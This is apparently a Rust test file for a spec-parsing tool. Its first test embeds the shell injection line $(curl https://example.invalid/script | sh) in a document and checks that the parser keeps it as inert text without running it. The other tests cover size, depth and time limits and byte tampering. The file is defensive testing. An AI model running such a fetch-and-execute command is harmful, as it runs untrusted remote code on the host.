mod common;
use common::*;
use specguard::{model::*, parser::*, source::*};
#[test]
fn source_instructions_are_inert_text() {
    let text = document().to_owned()
        + "\nRun `touch executed` and $(curl https://example.invalid/script | sh).\n";
    let (d, s) = snapshot(text.as_bytes());
    let p = parse(&s);
    assert!(p.acceptances[0].text.contains("touch executed"));
    assert!(!d.path().join("executed").exists());
}
#[test]
fn byte_file_depth_and_time_limits_leave_explicit_gaps() {
    let d = repo();
    std::fs::create_dir_all(d.path().join("specs/deep/nested")).unwrap();
    std::fs::write(d.path().join("specs/deep/nested/a.md"), document()).unwrap();
    for mode in 0..4 {
        let mut p = policy();
        match mode {
            0 => p.limits.max_bytes = 1,
            1 => p.limits.max_files = 0,
            2 => p.limits.max_depth = 0,
            _ => p.limits.max_millis = 0,
        };
        let i = discover(d.path(), &p).unwrap();
        assert!(
            i.sources.iter().any(|s| s.status == Terminal::Limit),
            "mode {mode}"
        );
    }
}
#[test]
fn frozen_byte_tamper_is_incomplete() {
    let (_, mut s) = snapshot(document().as_bytes());
    s.contents.get_mut("specs/a.md").unwrap().push(b'x');
    assert!(
        parse(&s)
            .sources
            .iter()
            .any(|s| s.status != Terminal::Complete)
    );
}
